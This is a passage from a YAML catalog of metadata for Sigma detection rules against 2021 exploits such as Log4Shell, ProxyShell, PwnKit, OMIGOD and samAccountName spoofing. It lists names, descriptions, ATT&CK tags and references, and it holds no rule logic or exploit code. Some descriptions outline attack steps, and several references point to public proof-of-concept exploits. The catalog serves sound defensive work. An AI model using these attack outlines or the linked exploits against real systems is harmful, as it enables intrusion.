  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-33771/file_event_win_cve_2021_31979_cve_2021_33771_exploits.yml
  name: CVE-2021-31979 CVE-2021-33771 Exploits by Sourgum
  description: Detects patterns as noticed in exploitation of Windows CVE-2021-31979
    CVE-2021-33771 vulnerability and DevilsTongue malware by threat group Sourgum
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1203
  - T1566
  tags:
  - attack.initial-access
  - attack.execution
  - attack.credential-access
  - attack.t1566
  - attack.t1203
  - cve.2021-33771
  - cve.2021-31979
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2021/07/15/protecting-customers-from-a-private-sector-offensive-actor-using-0-day-exploits-and-devilstongue-malware/
  - https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 32b5db62-cb5f-4266-9639-0fa48376ac00
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-33771/registry_set_cve_2021_31979_cve_2021_33771_exploits.yml
  name: CVE-2021-31979 CVE-2021-33771 Exploits
  description: Detects patterns as noticed in exploitation of Windows CVE-2021-31979
    CVE-2021-33771 vulnerability and DevilsTongue malware by threat group Sourgum
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1203
  - T1566
  tags:
  - attack.initial-access
  - attack.execution
  - attack.credential-access
  - attack.t1566
  - attack.t1203
  - cve.2021-33771
  - cve.2021-31979
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2021/07/15/protecting-customers-from-a-private-sector-offensive-actor-using-0-day-exploits-and-devilstongue-malware/
  - https://citizenlab.ca/2021/07/hooking-candiru-another-mercenary-spyware-vendor-comes-into-focus/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 75578840-9526-4b2a-9462-af469a45e767
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-35211/proc_creation_win_exploit_cve_2021_35211_servu.yml
  name: Serv-U Exploitation CVE-2021-35211 by DEV-0322
  description: Detects patterns as noticed in exploitation of Serv-U CVE-2021-35211
    vulnerability by threat group DEV-0322
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1136.001
  tags:
  - attack.persistence
  - attack.t1136.001
  - cve.2021-35211
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: ab6b1a39-a9ee-4ab4-b075-e83acf6e346b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-38647/zeek_http_exploit_cve_2021_38647_omigod_no_auth_rce.yml
  name: OMIGOD HTTP No Authentication RCE - CVE-2021-38647
  description: 'Detects the exploitation of OMIGOD (CVE-2021-38647) which allows remote
    execute (RCE) commands as root with just a single unauthenticated HTTP request.

    Verify, successful, exploitation by viewing the HTTP client (request) body to
    see what was passed to the server (using PCAP).

    Within the client body is where the code execution would occur. Additionally,
    check the endpoint logs to see if suspicious commands or activity occurred within
    the timeframe of this HTTP request.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: stable
  platform: zeek
  product: http
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1021.006
  - T1068
  - T1190
  - T1203
  - T1210
  tags:
  - attack.privilege-escalation
  - attack.initial-access
  - attack.execution
  - attack.lateral-movement
  - attack.t1068
  - attack.t1190
  - attack.t1203
  - attack.t1021.006
  - attack.t1210
  - detection.emerging-threats
  - cve.2021-38647
  time_window: ''
  references:
  - https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure
  - https://twitter.com/neu5ron/status/1438987292971053057?s=20
  false_positives:
  - Exploits that were attempted but unsuccessful.
  - Scanning attempts with the abnormal use of the HTTP POST method with no indication
    of code execution within the HTTP Client (Request) body. An example would be vulnerability
    scanners trying to identify unpatched versions while not actually exploiting the
    vulnerability. See description for investigation tips.
  notes: ''
- detection_id: 0506a799-698b-43b4-85a1-ac4c84c720e9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-4034/lnx_auth_exploit_cve_2021_4034_pwnkit_lpe.yml
  name: PwnKit Local Privilege Escalation
  description: Detects potential PwnKit exploitation CVE-2021-4034 in auth logs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: auth
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1548.001
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.001
  - detection.emerging-threats
  - cve.2021-4034
  time_window: ''
  references:
  - https://twitter.com/wdormann/status/1486161836961579020
  false_positives:
  - Unknown
  notes: ''
- detection_id: 60c0a111-787a-4e8a-9262-ee485f3ef9d5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-40444/file_event_win_exploit_cve_2021_40444.yml
  name: Suspicious Word Cab File Write CVE-2021-40444
  description: Detects file creation patterns noticeable during the exploitation of
    CVE-2021-40444
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1587
  tags:
  - attack.resource-development
  - attack.t1587
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/RonnyTNL/status/1436334640617373699?s=20
  - https://twitter.com/vanitasnk/status/1437329511142420483?s=21
  false_positives:
  - Unknown
  notes: ''
- detection_id: 894397c6-da03-425c-a589-3d09e7d1f750
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-40444/proc_creation_win_exploit_cve_2021_40444.yml
  name: Potential CVE-2021-40444 Exploitation Attempt
  description: Detects potential exploitation of CVE-2021-40444 via suspicious process
    patterns seen in in-the-wild exploitations
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  - cve.2021-40444
  - detection.emerging-threats
  time_window: ''
  references:
  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444
  - https://twitter.com/neonprimetime/status/1435584010202255375
  - https://www.joesandbox.com/analysis/476188/1/iochtml
  false_positives:
  - Unknown
  notes: ''
- detection_id: 868955d9-697e-45d4-a3da-360cefd7c216
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-40444/proc_creation_win_exploit_cve_2021_40444_office_directory_traversal.yml
  name: Potential Exploitation Attempt From Office Application
  description: Detects Office applications executing a child process that includes
    directory traversal patterns. This could be an attempt to exploit CVE-2022-30190
    (MSDT RCE) or CVE-2021-40444 (MSHTML RCE)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - attack.defense-evasion
  - cve.2021-40444
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/sbousseaden/status/1531653369546301440
  - https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-40444
  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30190
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6702b13c-e421-44cc-ab33-42cc25570f11
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-40539/web_cve_2021_40539_adselfservice.yml
  name: ADSelfService Exploitation
  description: Detects suspicious access to URLs that was noticed in cases in which
    attackers exploitated the ADSelfService vulnerability CVE-2021-40539
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - cve.2021-40539
  - detection.emerging-threats
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://us-cert.cisa.gov/ncas/alerts/aa21-259a
  false_positives:
  - Unknown
  notes: ''
- detection_id: fcbb4a77-f368-4945-b046-4499a1da69d1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-40539/web_cve_2021_40539_manageengine_adselfservice_exploit.yml
  name: CVE-2021-40539 Zoho ManageEngine ADSelfService Plus Exploit
  description: Detects an authentication bypass vulnerability affecting the REST API
    URLs in ADSelfService Plus (CVE-2021-40539).
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: critical
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1190
  - T1505.003
  tags:
  - attack.initial-access
  - attack.t1190
  - attack.persistence
  - attack.t1505.003
  - cve.2021-40539
  - detection.emerging-threats
  time_window: ''
  references:
  - https://therecord.media/cisa-warns-of-zoho-server-zero-day-exploited-in-the-wild/
  - https://www.manageengine.com/products/self-service-password/kb/how-to-fix-authentication-bypass-vulnerability-in-REST-API.html
  - https://us-cert.cisa.gov/ncas/alerts/aa21-259a
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3be82d5d-09fe-4d6a-a275-0d40d234d324
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-41379/file_event_win_cve_2021_41379_msi_lpe.yml
  name: InstallerFileTakeOver LPE CVE-2021-41379 File Create Event
  description: Detects signs of the exploitation of LPE CVE-2021-41379 that include
    an msiexec process that creates an elevation_service.exe file
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1068
  tags:
  - attack.privilege-escalation
  - attack.t1068
  - detection.emerging-threats
  time_window: ''
  references:
  - https://web.archive.org/web/20220421061949/https://github.com/klinix5/InstallerFileTakeOver
  - https://www.zerodayinitiative.com/advisories/ZDI-21-1308/
  false_positives:
  - Unknown
  - Possibly some Microsoft Edge upgrades
  notes: ''
- detection_id: af8bbce4-f751-46b4-8d91-82a33a736f61
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-41379/proc_creation_win_exploit_cve_2021_41379.yml
  name: Potential CVE-2021-41379 Exploitation Attempt
  description: Detects potential exploitation attempts of CVE-2021-41379 (InstallerFileTakeOver),
    a local privilege escalation (LPE) vulnerability where the attacker spawns a "cmd.exe"
    process as a child of Microsoft Edge elevation service "elevation_service" with
    "LOCAL_SYSTEM" rights
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1068
  tags:
  - attack.privilege-escalation
  - attack.t1068
  - cve.2021-41379
  - detection.emerging-threats
  time_window: ''
  references:
  - https://web.archive.org/web/20220421061949/https://github.com/klinix5/InstallerFileTakeOver
  - https://www.bleepingcomputer.com/news/microsoft/new-windows-zero-day-with-public-exploit-lets-you-become-an-admin/
  - https://www.zerodayinitiative.com/advisories/ZDI-21-1308/
  - https://www.logpoint.com/en/blog/detecting-privilege-escalation-zero-day-cve-2021-41379/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7dbb86de-a0cc-494c-8aa8-b2996c9ef3c8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-41379/win_vul_cve_2021_41379.yml
  name: LPE InstallerFileTakeOver PoC CVE-2021-41379
  description: Detects PoC tool used to exploit LPE vulnerability CVE-2021-41379
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - detection.emerging-threats
  time_window: ''
  references:
  - https://web.archive.org/web/20220421061949/https://github.com/klinix5/InstallerFileTakeOver
  false_positives:
  - Other MSI packages for which your admins have used that name
  notes: ''
- detection_id: 3007fec6-e761-4319-91af-e32e20ac43f5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-41773/web_cve_2021_41773_apache_path_traversal.yml
  name: CVE-2021-41773 Exploitation Attempt
  description: 'Detects exploitation of flaw in path normalization in Apache HTTP
    server 2.4.49.

    An attacker could use a path traversal attack to map URLs to files outside the
    expected document root.

    If files outside of the document root are not protected by "require all denied"
    these requests can succeed.

    Additionally this flaw could leak the source of interpreted files like CGI scripts.

    This issue is known to be exploited in the wild. This issue only affects Apache
    2.4.49 and not earlier versions.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2021-41773
  - detection.emerging-threats
  time_window: ''
  references:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-41773
  - https://github.com/apache/httpd/commit/e150697086e70c552b2588f369f2d17815cb1782
  - https://twitter.com/ptswarm/status/1445376079548624899
  - https://twitter.com/h4x0r_dz/status/1445401960371429381
  - https://github.com/projectdiscovery/nuclei-templates/blob/9d2889356eebba661c8407038e430759dfd4ec31/cves/2021/CVE-2021-41773.yaml
  - https://twitter.com/bl4sty/status/1445462677824761878
  false_positives:
  - Unknown
  notes: ''
- detection_id: 20c6ed1c-f7f0-4ea3-aa65-4f198e6acb0f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-42237/web_cve_2021_42237_sitecore_report_ashx.yml
  name: Sitecore Pre-Auth RCE CVE-2021-42237
  description: Detects exploitation attempts of Sitecore Experience Platform Pre-Auth
    RCE CVE-2021-42237 found in Report.ashx
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2021-42237
  - detection.emerging-threats
  time_window: ''
  references:
  - https://blog.assetnote.io/2021/11/02/sitecore-rce/
  - https://support.sitecore.com/kb?id=kb_article_view&sysparm_article=KB1000776
  false_positives:
  - Vulnerability Scanning
  notes: ''
- detection_id: 44bbff3e-4ca3-452d-a49a-6efa4cafa06f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-42278/win_system_exploit_cve_2021_42278.yml
  name: Potential CVE-2021-42278 Exploitation Attempt
  description: 'The attacker creates a computer object using those permissions with
    a password known to her.

    After that she clears the attribute ServicePrincipalName on the computer object.

    Because she created the object (CREATOR OWNER), she gets granted additional permissions
    and can do many changes to the object.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1558.003
  tags:
  - attack.credential-access
  - attack.t1558.003
  - cve.2021-42278
  - detection.emerging-threats
  time_window: ''
  references:
  - https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 45eb2ae2-9aa2-4c3a-99a5-6e5077655466
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-42287/win_security_samaccountname_spoofing_cve_2021_42287.yml
  name: Suspicious Computer Account Name Change CVE-2021-42287
  description: Detects the renaming of an existing computer account to a account name
    that doesn't contain a $ symbol as seen in attacks against CVE-2021-42287
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1036
  - T1098
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.persistence
  - attack.t1036
  - attack.t1098
  - cve.2021-42287
  - detection.emerging-threats
  time_window: ''
  references:
  - https://medium.com/@mvelazco/hunting-for-samaccountname-spoofing-cve-2021-42287-and-domain-controller-impersonation-f704513c8a45
  false_positives:
  - Unknown
  notes: ''
- detection_id: e80a0fee-1a62-4419-b31e-0d0db6e6013a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-42287/win_system_exploit_cve_2021_42287.yml
  name: Potential CVE-2021-42287 Exploitation Attempt
  description: 'The attacker creates a computer object using those permissions with
    a password known to her.

    After that she clears the attribute ServicePrincipalName on the computer object.

    Because she created the object (CREATOR OWNER), she gets granted additional permissions
    and can do many changes to the object.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1558.003
  tags:
  - attack.credential-access
  - attack.t1558.003
  - detection.emerging-threats
  - cve.2021-42287
  time_window: ''
  references:
  - https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing/
  false_positives:
  - Unknown
  notes: ''
- detection_id: c92f1896-d1d2-43c3-92d5-7a5b35c217bb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-42321/win_exchange_cve_2021_42321.yml
  name: Possible Exploitation of Exchange RCE CVE-2021-42321
  description: Detects log entries that appear in exploitation attempts against MS
    Exchange RCE CVE-2021-42321
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: msexchange-management
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1210
  tags:
  - attack.lateral-movement
  - attack.t1210
  - detection.emerging-threats
  time_window: ''
  references:
  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42321
  false_positives:
  - Unknown, please report false positives via https://github.com/SigmaHQ/sigma/issues
  notes: ''
- detection_id: 7b72b328-5708-414f-9a2a-6a6867c26e16
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-43798/web_cve_2021_43798_grafana.yml
  name: Grafana Path Traversal Exploitation CVE-2021-43798
  description: Detects a successful Grafana path traversal exploitation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: critical
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2021-43798
  - detection.emerging-threats
  time_window: ''
  references:
  - https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/
  - https://github.com/search?q=CVE-2021-43798
  false_positives:
  - Vulnerability scanners that scan a host that returns 200 status codes even in
    cases of a file not found or other error
  notes: ''
- detection_id: 7b501acf-fa98-4272-aa39-194f82edc8a3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-44077/file_event_win_cve_2021_44077_poc_default_files.yml
  name: CVE-2021-44077 POC Default Dropped File
  description: Detects the creation of "msiexec.exe" in the "bin" directory of the
    ManageEngine SupportCenter Plus (Related to CVE-2021-44077) and public POC available
    (See references section)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - cve.2021-44077
  - detection.emerging-threats
  time_window: ''
  references:
  - https://thedfirreport.com/2022/06/06/will-the-real-msiexec-please-stand-up-exploit-leads-to-data-exfiltration/
  - https://github.com/horizon3ai/CVE-2021-44077/blob/b7a48e25824e8ead95e028475c7fd0e107e6e6bf/exploit.py
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 3eb91f0a-0060-424a-a676-59f5fdd75610
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-44228/proc_creation_win_exploit_cve_2021_44228_vmware_horizon_log4j.yml
  name: Potential CVE-2021-44228 Exploitation Attempt - VMware Horizon
  description: 'Detects potential initial exploitation attempts against VMware Horizon
    deployments running a vulnerable versions of Log4j.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2021-44228
  - detection.emerging-threats
  time_window: ''
  references:
  - https://portswigger.net/daily-swig/vmware-horizon-under-attack-as-china-based-ransomware-group-targets-log4j-vulnerability
  - https://twitter.com/TheDFIRReport/status/1482078434327244805
  - https://www.pwndefend.com/2022/01/07/log4shell-exploitation-and-hunting-on-vmware-horizon-cve-2021-44228/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 5ea8faa8-db8b-45be-89b0-151b84c82702
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-44228/web_cve_2021_44228_log4j.yml
  name: Log4j RCE CVE-2021-44228 Generic
  description: Detects exploitation attempt against log4j RCE vulnerability reported
    as CVE-2021-44228 (Log4Shell)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - risk_scoring_or_weighting
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - detection.emerging-threats
  time_window: ''
  references:
  - https://web.archive.org/web/20231230220738/https://www.lunasec.io/docs/blog/log4j-zero-day/
  - https://news.ycombinator.com/item?id=29504755
  - https://github.com/tangxiaofeng7/apache-log4j-poc
  - https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b
  - https://github.com/YfryTchsGD/Log4jAttackSurface
  - https://twitter.com/shutingrz/status/1469255861394866177?s=21
  false_positives:
  - Vulnerability scanning
  notes: ''
- detection_id: 9be472ed-893c-4ec0-94da-312d2765f654
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/CVE-2021-44228/web_cve_2021_44228_log4j_fields.yml
  name: Log4j RCE CVE-2021-44228 in Fields
  description: Detects exploitation attempt against log4j RCE vulnerability reported
    as CVE-2021-44228 in different header fields found in web server logs (Log4Shell)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - risk_scoring_or_weighting
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2021-44228
  - detection.emerging-threats
  time_window: ''
  references:
  - https://web.archive.org/web/20231230220738/https://www.lunasec.io/docs/blog/log4j-zero-day/
  - https://news.ycombinator.com/item?id=29504755
  - https://github.com/tangxiaofeng7/apache-log4j-poc
  - https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b
  - https://github.com/YfryTchsGD/Log4jAttackSurface
  - https://twitter.com/shutingrz/status/1469255861394866177?s=21
  false_positives:
  - Vulnerability scanning
  notes: ''
- detection_id: 23eee45e-933b-49f9-ae1b-df706d2d52ef
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/ProxyShell-Exploit/web_exchange_proxyshell.yml
  name: Exchange ProxyShell Pattern
  description: Detects URL patterns that could be found in ProxyShell exploitation
    attempts against Exchange servers (failed and successful)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - detection.emerging-threats
  time_window: ''
  references:
  - https://youtu.be/5mqid-7zp8k?t=2231
  - https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html
  - https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1
  false_positives:
  - Unknown
  notes: ''
- detection_id: 992be1eb-e5da-437e-9a54-6d13b57bb4d8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/ProxyShell-Exploit/web_exchange_proxyshell_successful.yml
  name: Successful Exchange ProxyShell Attack
  description: Detects URP patterns and status codes that indicate a successful ProxyShell
    exploitation attack against Exchange servers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.initial-access
  - detection.emerging-threats
  time_window: ''
  references:
  - https://youtu.be/5mqid-7zp8k?t=2231
  - https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html
  - https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1
  false_positives:
  - Unknown
  notes: ''
- detection_id: a4eaf250-7dc1-4842-862a-5e71cd59a167
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/RazerInstaller-LPE-Exploit/proc_creation_win_exploit_other_razorinstaller_lpe.yml
  name: Suspicious RazerInstaller Explorer Subprocess
  description: Detects a explorer.exe sub process of the RazerInstaller software which
    can be invoked from the installer to select a different installation folder but
    can also be exploited to escalate privileges to LOCAL SYSTEM
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1553
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1553
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/j0nh4t/status/1429049506021138437
  - https://streamable.com/q2dsji
  false_positives:
  - User selecting a different installation folder (check for other sub processes
    of this explorer.exe process)
  notes: ''
- detection_id: c01f7bd6-0c1d-47aa-9c61-187b91273a16
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/SystemNightmare-Exploit/proc_creation_win_exploit_other_systemnightmare.yml
  name: Potential SystemNightmare Exploitation Attempt
  description: Detects an exploitation attempt of SystemNightmare in order to obtain
    a shell as LOCAL_SYSTEM
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1068
  tags:
  - attack.privilege-escalation
  - attack.t1068
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/GossiTheDog/SystemNightmare
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6f55f047-112b-4101-ad32-43913f52db46
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Exploits/VisualDoor-Exploit/web_sonicwall_jarrewrite_exploit.yml
  name: SonicWall SSL/VPN Jarrewrite Exploitation
  description: Detects exploitation attempts of the SonicWall Jarrewrite Exploit
